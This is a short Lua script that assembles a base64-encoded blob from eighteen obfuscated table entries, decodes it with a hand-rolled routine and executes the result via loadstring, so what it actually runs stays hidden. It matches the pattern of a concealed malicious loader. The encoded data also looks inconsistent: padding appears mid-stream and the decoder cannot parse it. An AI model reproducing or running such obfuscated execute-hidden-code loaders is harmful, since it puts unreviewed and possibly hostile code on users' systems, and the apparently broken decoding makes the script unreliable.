local _e8060999 = {}
_e8060999[1] = "8oNwV1dLYHD3Ohx0/n62qdfu8H7hAudXo6qx5+I0HR4o9LU1UK"; _e8060999[2] = "I8pxCgIJyCRaAE4lsmBoLABkA7/h2hBaeH0In/AUYhB5yEWOJo"; _e8060999[3] = "ETXHR7zUCBCbtLBCnVg6D7kgVehzlRCx1bTwlnCpiqDAx1CVNY"; _e8060999[4] = "UOiYyBCXJVr1kBGBSxRdzx7v8aj3/eZ+c9bvP1h8z9kCEUYUwf"; _e8060999[5] = "ZeDgIgTtP6spSO3LXLkEt/jy3rmeATBptdXrKKba9Z7VljPBtj"; _e8060999[6] = "eJytU9tumzAYvucpEFJVkDK8hCVdO+2ibQ47VJG6tot2FRn4IW"; _e8060999[7] = "uOZpR5RKEJaHGRcFVr5XGm7qZ5olinDmBxV6PePn5rddfDCeJq"; _e8060999[8] = "SaFwVm6T3/opmF9ByS7ZGYrd3XRS517Hsn0uuYwcD9beddtQDm"; _e8060999[9] = "H6OJ88Xk5Yki0/zUeRFDM6vnk1/Da5+syn2aw3i6YyEaPRJhl0"; _e8060999[10] = "D80xN5GgRmAFgaGMJnFYFjVhoXKVC8gXTLKQ3fz0rLEWsOKge2"; _e8060999[11] = "+Y8o/RqwT+AH4VDKg="; _e8060999[12] = "LZQq5QVCKZEJF2mY8ALhkqB1PSJRNzo/O+8N3ryNeueDQT+Keh"; _e8060999[13] = "o+VtNizG8VW++fHwtSjj1TJ7vO2zG8+hlR4BCZAViCkuwApaES"; _e8060999[14] = "XKidxqYh9PiitGhtitIWXEtDWkBfLIWhjfTQoonYrrewPBfBvl"; _e8060999[15] = "KvL8eEkpIwXn9NsEiBWRUoFpglixr8rsRrBiKkGjcUtYwj9Sbk"; _e8060999[16] = "6NTXxIlk3bs8+G0ByKtptxg7B/fyc+U55g6moJYgbxgvMn973r"; _e8060999[17] = "8Ky6dQ2gu2F5NTB2121pgo/3XYDdqBW6zUwLXWpQYNc87mCiiU"; _e8060999[18] = "WVuXobsP5ntPZROKYQEmb0Kv/Id+e/xWz11QJtylXSL00cXKOg"
local _4275f6b9 = ""
for i = 1, #_e8060999 do
    _4275f6b9 = _4275f6b9 .. (_e8060999[i] or "")
end
local _af8d1e2c = ""
local _926e149c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
for i = 1, #_4275f6b9, 4 do
    local _825a8410 = _4275f6b9:sub(i, i+3)
    local _a3e3819e = 0
    for j = 1, #_825a8410 do
        local _9864c12f = _926e149c:find(_825a8410:sub(j,j)) - 1
        _a3e3819e = _a3e3819e + _9864c12f * (64 ^ (4-j))
    end
    for j = 1, 3 do
        if i + j - 1 <= #_4275f6b9 then
            _af8d1e2c = _af8d1e2c .. string.char(math.floor(_a3e3819e / (256 ^ (3-j))) % 256)
        end
    end
end
local _d0e46685 = ""
local _b6fbaaf3 = 1
while _b6fbaaf3 <= #_af8d1e2c do
    local _66835f3e = _af8d1e2c:byte(_b6fbaaf3)
    _d0e46685 = _d0e46685 .. string.char(_66835f3e)
    _b6fbaaf3 = _b6fbaaf3 + 1
end
loadstring(_d0e46685)()